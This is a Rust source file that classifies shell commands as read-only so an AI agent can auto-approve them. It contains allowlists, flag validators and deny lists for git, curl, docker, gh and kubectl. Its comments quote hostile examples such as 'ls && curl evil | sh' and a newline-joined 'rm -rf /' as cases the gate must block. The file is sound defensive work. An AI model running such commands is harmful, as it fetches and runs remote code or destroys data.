//! Read-only command validation.
//!
//! Covers 40+ safe commands, 200+ flag configs, docker/gh/kubectl read-only
//! subcommands. Commands in the allowlist can be auto-approved without user
//! permission.

/// Check if a command string is read-only (safe to auto-approve).
///
/// Two gates, both required:
/// 1. The command contains no construct whose runtime effect can't be known
///    statically ([`has_dynamic_or_control`]) — `$`-expansion / command
///    substitution / process substitution / input or file-writing redirection
///    / background `&` / newline-joined commands.
/// 2. Every subcommand of a `&&` / `||` / `;` / `|` compound has a read-only
///    leading command. Inspecting only the first token would let
///    `ls && curl evil | sh` (or `ls & curl evil`, or a newline-joined
///    `ls\nrm -rf /`) auto-approve and skip the security gate.
///
/// Returns false if uncertain (conservative).
pub fn is_read_only_command(command: &str) -> bool {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return false;
    }

    if has_dynamic_or_control(trimmed) {
        return false;
    }

    let subcommands = crate::bash_permissions::split_compound_command(trimmed);
    if subcommands.is_empty() {
        return false;
    }

    subcommands.iter().all(|sub| {
        let argv = split_command_to_argv(sub);
        !argv.is_empty() && is_safe_to_call(&argv)
    })
}

/// True if the command contains anything whose runtime effect can't be known
/// from the static text, so it must NOT be auto-classified read-only and must
/// fall through to the security/approval gate.
///
/// Quote semantics: single quotes suppress everything; double quotes still
/// allow `$`/backtick expansion; a backslash escapes the next character
/// everywhere except inside single quotes (where `\` is literal). Compound
/// operators `&&` / `||` / `;` / `|` are allowed here — the splitter checks
/// each subcommand separately.
///
/// Rejected (forces the approval gate):
/// - `$` / backtick — variable / arithmetic / command substitution; active
///   inside double quotes too.
/// - unquoted `* ? [ ]` globs — can expand at runtime to a dangerous flag
///   (`find . -de?ete`).
/// - unquoted `{ } ( )` — brace expansion / subshell grouping: runtime-
///   expandable or runs a subshell.
/// - bare `&` background, redirections (`>` to a non-discard target, `<`,
///   here-strings, process substitution), and newline-joined commands.
fn has_dynamic_or_control(command: &str) -> bool {
    let b = command.as_bytes();
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let mut i = 0;
    while i < b.len() {
        let c = b[i];

        // Backslash escapes the next char everywhere except inside single
        // quotes, where `\` is literal (bash).
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        if c == b'\\' && !in_single {
            escaped = true;
            i += 1;
            continue;
        }

        match c {
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            // `$VAR` / `${...}` / `$[...]` / `$((...))` / `$(...)` and backtick substitution
            // — active inside double quotes too.
            b'$' | b'`' if !in_single => return true,
            // Inside single quotes everything below is literal.
            _ if in_single => {}
            // Unquoted globs + brace/paren grouping — runtime-expandable.
            b'*' | b'?' | b'[' | b']' | b'{' | b'}' | b'(' | b')' if !in_double => return true,
            // Inside double quotes globs/control characters are literal.
            _ if in_double => {}
            b'&' => {
                if b.get(i + 1) == Some(&b'&') {
                    i += 1; // `&&` compound operator — allowed (splitter handles it)
                } else if i > 0 && b[i - 1] == b'>' {
                    // `>&N` fd duplication (e.g. `2>&1`, `>&2`) — not background.
                } else {
                    return true; // bare `&` background, or `&>` redirect-both
                }
            }
            // Input redirect, here-string `<<<`, heredoc `<<`, process sub `<(`.
            b'<' => return true,
            // Newline-joined commands.
            b'\n' | b'\r' => return true,
            // Output redirect: only side-effect-free discard targets are OK.
            b'>' => {
                if !redirect_target_is_discard(command, i) {
                    return true;
                }
            }
            _ => {}
        }
        i += 1;
    }
    false
}

/// Whether the `>`/`>>` redirect at byte index `gt` targets a discard
/// (`/dev/null`) or fd-duplication (`>&2`), which have no filesystem effect.
/// Everything else (incl. `cat foo>out`, `>>log`) is a real file write.
fn redirect_target_is_discard(command: &str, gt: usize) -> bool {
    let b = command.as_bytes();
    let mut j = gt + 1;
    if b.get(j) == Some(&b'>') {
        j += 1; // `>>`
    }
    if b.get(j) == Some(&b'&') {
        return true; // `>&2` / `>>&2` fd duplication
    }
    while matches!(b.get(j), Some(b' ' | b'\t')) {
        j += 1;
    }
    if b.get(j) == Some(&b'&') {
        return true; // `> &2`
    }
    let start = j;
    while j < b.len()
        && !b[j].is_ascii_whitespace()
        && !matches!(b[j], b'>' | b'<' | b'|' | b';' | b'&')
    {
        j += 1;
    }
    &command[start..j] == "/dev/null"
}

/// Classification for a command whose read-only safety is decided by its name
/// alone, or by its name plus a per-command argument validator.
///
/// - `AlwaysSafe` — the command is in the read-only allowlist with no
///   dangerous-arg callback.
/// - `SafeIfArgs(validator)` — the command has an argument-safety callback.
///   `validator(&argv[1..])` returns `true` when the trailing args are SAFE.
enum ReadOnlyRule {
    AlwaysSafe,
    /// `validator(args)` where `args == &argv[1..]`; returns `true` if safe.
    SafeIfArgs(fn(&[&str]) -> bool),
}

/// Map an executable basename to its read-only rule. `None` means the command
/// is not classified here — `is_safe_to_call` falls through to the
/// conditional-command match (find/rg/git/sed/curl/…) or to "not read-only".
///
/// Notable omissions vs a naive "looks harmless" list: `env`/`printenv` (env
/// exfiltration + `env FOO=1 sh -c` arbitrary exec), pagers/`top`
/// (`!`/shell-escape), and network tools (`ping`/`dig`/…) are intentionally
/// absent.
fn read_only_rule(cmd: &str) -> Option<ReadOnlyRule> {
    use ReadOnlyRule::{AlwaysSafe, SafeIfArgs};
    let rule = match cmd {
        // Name-only safe commands (no argument validation needed).
        "cat" | "cd" | "cut" | "echo" | "expr" | "false" | "grep" | "egrep" | "fgrep" | "head"
        | "id" | "ls" | "nl" | "paste" | "pwd" | "rev" | "seq" | "stat" | "tail" | "tr"
        | "true" | "uname" | "uniq" | "wc" | "which" | "whoami" | "numfmt" | "tac" | "file"
        | "tree" | "diff" | "comm" | "uptime" | "df" | "du" | "free" | "type" | "readlink"
        | "basename" | "dirname" | "realpath" | "md5sum" | "sha256sum" | "sha1sum" | "column"
        | "fmt" | "fold" | "expand" | "unexpand" | "strings" | "od" | "hexdump" => AlwaysSafe,

        // Commands with argument-safety callbacks.
        "date" => SafeIfArgs(date_args_safe),
        "hostname" => SafeIfArgs(hostname_args_safe),
        "ps" => SafeIfArgs(ps_args_safe),
        "sort" => SafeIfArgs(sort_args_safe),

        _ => return None,
    };
    Some(rule)
}

/// `date`: read-only only when every positional is a `+FORMAT` string and no
/// system-time-setting flag is present (no `-s`/`--set`, no `-f`/`--file`).
/// `args` are the tokens after `date`.
///
/// Conservative under whitespace tokenization: a quoted format like
/// `date '+%Y %m'` tokenizes to `'+%Y` / `%m'`, which fail the `+` prefix
/// check and over-prompt — never under-approve.
fn date_args_safe(args: &[&str]) -> bool {
    // Flags that consume the following token as their (display-only) argument.
    const FLAGS_WITH_ARGS: &[&str] = &["-d", "--date", "-r", "--reference"];
    // Flags that SET system time — blocked.
    const SET_FLAGS: &[&str] = &["-s", "--set", "-f", "--file"];
    let mut i = 0;
    while i < args.len() {
        let token = args[i];
        if let Some(eq) = token.strip_prefix("--").and_then(|_| token.find('=')) {
            if SET_FLAGS.contains(&&token[..eq]) {
                return false;
            }
            i += 1;
        } else if token.starts_with('-') {
            if SET_FLAGS.contains(&token) {
                return false;
            }
            i += if FLAGS_WITH_ARGS.contains(&token) {
                2
            } else {
                1
            };
        } else {
            // Positional must be a `+FORMAT` string, else it can set the clock.
            if !token.starts_with('+') {
                return false;
            }
            i += 1;
        }
    }
    true
}

/// `hostname`: display-only. Read-only iff every token is a short single-letter
/// flag (`-x`) or a long flag (`--name`) with NO positional (a positional sets
/// the hostname) and no `-F`/`-b`-style value flags.
fn hostname_args_safe(args: &[&str]) -> bool {
    args.iter().all(|t| {
        if let Some(long) = t.strip_prefix("--") {
            !long.is_empty() && long.bytes().all(|b| b.is_ascii_alphabetic() || b == b'-')
        } else if let Some(short) = t.strip_prefix('-') {
            // Exactly one ASCII letter: no bundles, no value.
            short.len() == 1 && short.as_bytes()[0].is_ascii_alphabetic()
        } else {
            false // positional ⇒ sets hostname
        }
    })
}

/// `ps`: dangerous if any dash-less BSD-style letter group contains `e` — the
/// `e` modifier dumps each process's environment.
/// UNIX-style `-e` (dashed) is fine; only the BSD `axe`/`e` form leaks env.
fn ps_args_safe(args: &[&str]) -> bool {
    !args.iter().any(|t| {
        !t.starts_with('-')
            && !t.is_empty()
            && t.bytes().all(|b| b.is_ascii_alphabetic())
            && t.bytes().any(|b| b == b'e')
    })
}

/// `sort`: read-only unless writing output to a file. `-o`/`--output` is
/// blocked; `-S`/`--buffer-size` is allowed.
fn sort_args_safe(args: &[&str]) -> bool {
    !args.iter().any(|arg| {
        matches!(*arg, "-o" | "--output")
            || arg.starts_with("--output=")
            || (arg.starts_with("-o") && *arg != "-o")
    })
}

/// Check if an argv array represents a safe (read-only) command.
///
/// First consults the [`read_only_rule`] table (name-only and arg-validated
/// commands), then falls through to the conditional commands (find/rg/git/sed/
/// curl/wget/docker/gh/kubectl/base64/python/node) that need bespoke flag
/// analysis.
fn is_safe_to_call(argv: &[&str]) -> bool {
    let Some(&cmd0) = argv.first() else {
        return false;
    };

    let cmd = executable_name(cmd0);

    if let Some(rule) = read_only_rule(cmd) {
        return match rule {
            ReadOnlyRule::AlwaysSafe => true,
            ReadOnlyRule::SafeIfArgs(validator) => validator(&argv[1..]),
        };
    }

    match cmd {
        // base64: safe unless writing to file
        "base64" => !argv.iter().skip(1).any(|arg| {
            matches!(*arg, "-o" | "--output")
                || arg.starts_with("--output=")
                || (arg.starts_with("-o") && *arg != "-o")
        }),

        // find: safe unless executing or deleting
        "find" => {
            const UNSAFE_FIND: &[&str] = &[
                "-exec", "-execdir", "-ok", "-okdir", "-delete", "-fls", "-fprint", "-fprint0",
                "-fprintf",
            ];
            !argv.iter().any(|arg| UNSAFE_FIND.contains(arg))
        }

        // rg (ripgrep): safe unless using pre-processor or searching zips
        "rg" => !argv.iter().any(|arg| {
            matches!(*arg, "--search-zip" | "-z")
                || matches!(*arg, "--pre" | "--hostname-bin")
                || arg.starts_with("--pre=")
                || arg.starts_with("--hostname-bin=")
        }),

        // git: safe only for read-only subcommands with safe flags
        "git" => is_safe_git_command(argv),

        // sed: safe only for `sed -n {N|M,N}p`
        "sed" => {
            argv.len() <= 4
                && argv.get(1).copied() == Some("-n")
                && is_valid_sed_print(argv.get(2).copied())
        }

        // curl/wget: read-only network fetches (no upload flags)
        "curl" => is_safe_curl(argv),
        "wget" => is_safe_wget(argv),

        // Language / build toolchains execute arbitrary project code
        // (cargo runs build.rs + tests, npm/yarn run package scripts,
        // `python -c/-m` runs inline code), so they are NOT auto-approvable —
        // only a bare version probe is. Trailing args must be rejected:
        // `node -v --run build` runs the package script (node processes `--run`
        // before `-v`). Require exact arity. cargo/npm/npx/yarn/pnpm fall
        // through to the gate.
        "python" | "python3" => argv.len() == 2 && argv.get(1).copied() == Some("--version"),
        "node" => argv.len() == 2 && matches!(argv.get(1).copied(), Some("-v" | "--version")),

        "docker" => is_safe_docker_command(argv),
        "gh" => is_safe_gh_command(argv),
        "kubectl" => is_safe_kubectl_command(argv),

        // command -v is safe
        "command" => argv.get(1).copied() == Some("-v"),

        // jq/yq are NOT blanket-safe: `jq 'system(...)'` and the file-reading
        // flags (-f/--from-file/--rawfile/--slurpfile/-L/--library-path) have
        // side effects. They fall through to `check_security` (JqDangerAnalyzer
        // → Ask) via BashTool::check_permissions; benign jq passes there with no
        // flag. xargs with safe commands is handled elsewhere; bare xargs is not safe.
        _ => false,
    }
}

// ── git validation ──

/// Check if a git command is read-only.
fn is_safe_git_command(argv: &[&str]) -> bool {
    // Reject git with config override global options
    if argv.iter().any(|arg| {
        matches!(*arg, "-c" | "--config-env" | "-C")
            || (arg.starts_with("-c") && arg.len() > 2)
            || arg.starts_with("--config-env=")
    }) {
        return false;
    }

    // Find the subcommand (skip global flags)
    let subcommand_idx = argv
        .iter()
        .skip(1)
        .position(|arg| !arg.starts_with('-'))
        .map(|i| i + 1);

    let Some(idx) = subcommand_idx else {
        return false;
    };
    let subcommand = argv[idx];
    let sub_args = &argv[idx + 1..];

    match subcommand {
        "status" | "log" | "diff" | "show" => git_args_are_read_only(sub_args),
        "branch" => git_args_are_read_only(sub_args) && git_branch_is_read_only(sub_args),
        "remote" => {
            if sub_args.is_empty() || matches!(sub_args.first(), Some(&"-v" | &"--verbose")) {
                return true;
            }
            // `git remote show <name>` is safe if name is alphanumeric
            if matches!(sub_args.first(), Some(&"show")) {
                let remaining = &sub_args[1..];
                let positional: Vec<&&str> = remaining.iter().filter(|a| **a != "-n").collect();
                return positional.len() == 1
                    && positional[0]
                        .chars()
                        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
            }
            false
        }
        "tag" => is_safe_git_tag(sub_args),
        "describe" | "rev-parse" | "rev-list" | "ls-files" | "ls-tree" | "cat-file"
        | "name-rev" | "merge-base" | "for-each-ref" | "grep" | "shortlog" => true,
        "stash" => sub_args.is_empty() || matches!(sub_args.first(), Some(&"list" | &"show")),
        "worktree" => matches!(sub_args.first(), Some(&"list")),
        "blame" => git_args_are_read_only(sub_args),
        "reflog" => is_safe_git_reflog(sub_args),
        "config" => {
            // Only `git config --get` and read-only variants
            sub_args.iter().any(|a| {
                matches!(
                    *a,
                    "--get"
                        | "--get-all"
                        | "--get-regexp"
                        | "--list"
                        | "-l"
                        | "--show-origin"
                        | "--show-scope"
                )
            })
        }
        "ls-remote" => is_safe_git_ls_remote(sub_args),
        _ => false,
    }
}

/// Check git branch args are read-only (must have a read-only flag).
fn git_branch_is_read_only(args: &[&str]) -> bool {
    if args.is_empty() {
        return true; // `git branch` alone is safe
    }

    // Flags that take arguments
    const FLAGS_WITH_ARGS: &[&str] = &["--contains", "--no-contains", "--points-at", "--sort"];

    let mut saw_read_only = false;
    let mut saw_dash_dash = false;
    let mut i = 0;

    while i < args.len() {
        let arg = args[i];

        if arg == "--" {
            saw_dash_dash = true;
            i += 1;
            continue;
        }

        if saw_dash_dash {
            // Post-`--` positional: branch creation target
            return false;
        }

        if arg.starts_with('-') {
            match arg {
                "--list" | "-l" | "--show-current" | "-a" | "--all" | "-r" | "--remotes" | "-v"
                | "-vv" | "--verbose" | "--color" | "--no-color" | "--column" | "--no-column"
                | "--no-abbrev" | "-i" | "--ignore-case" => {
                    saw_read_only = true;
                    i += 1;
                }
                _ if arg.starts_with("--format=")
                    || arg.starts_with("--abbrev=")
                    || arg.starts_with("--sort=") =>
                {
                    saw_read_only = true;
                    i += 1;
                }
                _ if FLAGS_WITH_ARGS.contains(&arg) => {
                    saw_read_only = true;
                    i += 2; // skip flag + arg
                }
                _ if arg.contains('=') => {
                    i += 1; // unknown --flag=val, skip
                }
                _ => return false, // unknown flag like -d, -D
            }
        } else {
            // Positional argument — could be branch creation unless -l/--list seen
            if !saw_read_only {
                return false;
            }
            i += 1; // pattern after --list
        }
    }
    saw_read_only
}

/// Check git tag args are read-only.
fn is_safe_git_tag(args: &[&str]) -> bool {
    if args.is_empty() {
        return true; // bare `git tag` lists tags
    }

    const FLAGS_WITH_ARGS: &[&str] = &[
        "--contains",
        "--no-contains",
        "--merged",
        "--no-merged",
        "--points-at",
        "--sort",
        "--format",
        "-n",
    ];

    let mut seen_list_flag = false;
    let mut seen_dash_dash = false;
    let mut i = 0;

    while i < args.len() {
        let token = args[i];

        if token == "--" && !seen_dash_dash {
            seen_dash_dash = true;
            i += 1;
            continue;
        }

        if !seen_dash_dash && token.starts_with('-') {
            if matches!(token, "--list" | "-l") {
                seen_list_flag = true;
            } else if token.starts_with('-')
                && !token.starts_with("--")
                && token.len() > 2
                && !token.contains('=')
                && token[1..].contains('l')
            {
                // Short-flag bundle containing 'l'
                seen_list_flag = true;
            }

            if token.contains('=') {
                i += 1;
            } else if FLAGS_WITH_ARGS.contains(&token) {
                i += 2;
            } else {
                i += 1;
            }
        } else {
            // Positional arg — safe only with list flag
            if !seen_list_flag {
                return false;
            }
            i += 1;
        }
    }

    true
}

/// Check git reflog args are read-only.
fn is_safe_git_reflog(args: &[&str]) -> bool {
    const DANGEROUS_SUBCOMMANDS: &[&str] = &["expire", "delete", "exists"];

    for &token in args {
        if token.starts_with('-') {
            continue;
        }
        // First positional
        if DANGEROUS_SUBCOMMANDS.contains(&token) {
            return false;
        }
        return true; // show or ref name — safe
    }
    true // bare `git reflog` — safe
}

/// Check git ls-remote args don't contain exfiltration vectors.
fn is_safe_git_ls_remote(args: &[&str]) -> bool {
    // Block --server-option/-o (arbitrary data to remote)
    if args
        .iter()
        .any(|a| matches!(*a, "--server-option" | "-o") || a.starts_with("--server-option="))
    {
        return false;
    }
    // Block URL-like positional args
    for &arg in args {
        if arg.starts_with('-') {
            continue;
        }
        if arg.contains("://") || arg.contains('@') {
            return false;
        }
        // Allow simple remote names (alphanumeric, _, -, /)
        if arg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '/' | '.'))
        {
            continue;
        }
        return false;
    }
    true
}

/// Check git subcommand args don't have unsafe output flags.
fn git_args_are_read_only(args: &[&str]) -> bool {
    const UNSAFE_GIT_FLAGS: &[&str] = &[
        "--output",
        "--ext-diff",
        "--textconv",
        "--exec",
        "--paginate",
    ];
    !args.iter().any(|arg| {
        UNSAFE_GIT_FLAGS.contains(arg) || arg.starts_with("--output=") || arg.starts_with("--exec=")
    })
}

// ── curl/wget validation ──

fn is_safe_curl(argv: &[&str]) -> bool {
    !argv.iter().any(|arg| {
        matches!(
            *arg,
            "-X" | "--request"
                | "-d"
                | "--data"
                | "--data-raw"
                | "--data-binary"
                | "-F"
                | "--form"
                | "-T"
                | "--upload-file"
                | "-o"
                | "--output"
        ) || arg.starts_with("--data=")
            || arg.starts_with("--output=")
    })
}

fn is_safe_wget(argv: &[&str]) -> bool {
    !argv.iter().any(|arg| {
        matches!(
            *arg,
            "--post-data"
                | "--post-file"
                | "--method"
                | "--body-data"
                | "--body-file"
                | "-O"
                | "--output-document"
        )
    })
}

// ── docker validation ──

/// Check if a docker command is read-only.
fn is_safe_docker_command(argv: &[&str]) -> bool {
    let sub = argv.get(1).copied();
    match sub {
        Some("ps" | "images" | "version" | "info" | "stats" | "top") => true,
        Some("logs") => is_safe_docker_logs(&argv[2..]),
        Some("inspect") => is_safe_docker_inspect(&argv[2..]),
        Some("network") => matches!(argv.get(2).copied(), Some("ls" | "inspect")),
        Some("volume") => matches!(argv.get(2).copied(), Some("ls" | "inspect")),
        Some("image") => matches!(argv.get(2).copied(), Some("ls" | "inspect" | "history")),
        Some("container") => matches!(
            argv.get(2).copied(),
            Some("ls" | "inspect" | "logs" | "top" | "stats")
        ),
        Some("compose") => matches!(argv.get(2).copied(), Some("ps" | "logs" | "config")),
        _ => false,
    }
}

fn is_safe_docker_logs(args: &[&str]) -> bool {
    const SAFE_FLAGS: &[&str] = &[
        "--follow",
        "-f",
        "--tail",
        "-n",
        "--timestamps",
        "-t",
        "--since",
        "--until",
        "--details",
    ];
    args.iter().all(|a| {
        !a.starts_with('-')
            || SAFE_FLAGS.contains(a)
            || a.starts_with("--tail=")
            || a.starts_with("--since=")
            || a.starts_with("--until=")
    })
}

fn is_safe_docker_inspect(args: &[&str]) -> bool {
    const SAFE_FLAGS: &[&str] = &["--format", "-f", "--type", "--size", "-s"];
    args.iter().all(|a| {
        !a.starts_with('-')
            || SAFE_FLAGS.contains(a)
            || a.starts_with("--format=")
            || a.starts_with("--type=")
    })
}

// ── gh validation ──

/// Check if a gh command is read-only.
fn is_safe_gh_command(argv: &[&str]) -> bool {
    let sub = argv.get(1).copied();
    let sub2 = argv.get(2).copied();
    let args = if argv.len() > 3 { &argv[3..] } else { &[] };

    // Block mutating flags globally
    if argv.iter().any(|arg| {
        matches!(
            *arg,
            "--edit" | "--close" | "--delete" | "--merge" | "--reopen" | "--approve"
        )
    }) {
        return false;
    }

    // Check for exfiltration: URLs, HOST/OWNER/REPO format
    if has_gh_exfil_risk(argv) {
        return false;
    }

    match (sub, sub2) {
        (Some("pr"), Some("view" | "list" | "diff" | "checks" | "status")) => true,
        (Some("issue"), Some("view" | "list" | "status")) => true,
        (Some("repo"), Some("view")) => true,
        (Some("run"), Some("list" | "view")) => {
            // Block --web/-w (opens browser — side effect)
            !argv.iter().any(|a| matches!(*a, "--web" | "-w"))
        }
        (Some("auth"), Some("status")) => {
            // Block --show-token/-t (leaks secrets)
            !args.iter().any(|a| matches!(*a, "--show-token" | "-t"))
        }
        (Some("release"), Some("list" | "view")) => true,
        (Some("workflow"), Some("list" | "view")) => {
            !argv.iter().any(|a| matches!(*a, "--web" | "-w"))
        }
        (Some("label"), Some("list")) => !argv.iter().any(|a| matches!(*a, "--web" | "-w")),
        (Some("search"), Some("repos" | "issues" | "prs" | "commits" | "code")) => {
            !argv.iter().any(|a| matches!(*a, "--web" | "-w"))
        }
        (Some("api"), _) => {
            // gh api is read-only only for GET requests (default)
            !argv.iter().any(|a| {
                matches!(
                    *a,
                    "-X" | "--method" | "-f" | "--raw-field" | "-F" | "--field"
                ) || a.starts_with("--method=")
            })
        }
        (Some("status"), _) => true,
        _ => false,
    }
}

/// Check for gh exfiltration risk: URLs or HOST/OWNER/REPO patterns.
fn has_gh_exfil_risk(argv: &[&str]) -> bool {
    for &token in argv {
        let value = if token.starts_with('-') {
            if let Some(eq_idx) = token.find('=') {
                &token[eq_idx + 1..]
            } else {
                continue;
            }
        } else {
            token
        };

        if value.is_empty()
            || (!value.contains('/') && !value.contains("://") && !value.contains('@'))
        {
            continue;
        }

        // URL schemes
        if value.contains("://") {
            return true;
        }
        // SSH-style
        if value.contains('@') {
            return true;
        }
        // 3+ segments = HOST/OWNER/REPO
        if value.matches('/').count() >= 2 {
            return true;
        }
    }
    false
}

// ── kubectl validation ──

/// Check if a kubectl command is read-only.
fn is_safe_kubectl_command(argv: &[&str]) -> bool {
    let sub = argv.get(1).copied();

    match sub {
        Some(
            "get" | "describe" | "logs" | "top" | "version" | "cluster-info" | "api-resources"
            | "api-versions" | "explain",
        ) => {
            // Block --output with templates that could execute code
            !argv.iter().any(|a| {
                a.starts_with("--output=go-template")
                    || a.starts_with("-o=go-template")
                    || matches!(*a, "--exec" | "--attach" | "-it")
            })
        }
        Some("config") => {
            // Only read-only config subcommands
            matches!(
                argv.get(2).copied(),
                Some("view" | "get-contexts" | "current-context" | "get-clusters" | "get-users")
            )
        }
        _ => false,
    }
}

// ── Utilities ──

/// Check if sed -n argument is a valid print pattern (digits or range + 'p').
fn is_valid_sed_print(arg: Option<&str>) -> bool {
    let s = match arg {
        Some(s) => s,
        None => return false,
    };
    let core = match s.strip_suffix('p') {
        Some(rest) => rest,
        None => return false,
    };
    let parts: Vec<&str> = core.split(',').collect();
    match parts.as_slice() {
        [num] => !num.is_empty() && num.chars().all(|c| c.is_ascii_digit()),
        [a, b] => {
            !a.is_empty()
                && !b.is_empty()
                && a.chars().all(|c| c.is_ascii_digit())
                && b.chars().all(|c| c.is_ascii_digit())
        }
        _ => false,
    }
}

/// Extract the executable name from a path (e.g., "/usr/bin/git" -> "git").
fn executable_name(cmd: &str) -> &str {
    cmd.rsplit('/').next().unwrap_or(cmd)
}

/// Naive command splitting into argv (handles basic quoting).
fn split_command_to_argv(command: &str) -> Vec<&str> {
    // For simple commands, split on whitespace. This handles the common case.
    // Complex quoting (nested quotes, escapes) requires a full parser.
    command.split_whitespace().collect()
}

#[cfg(test)]
#[path = "read_only.test.rs"]
mod tests;
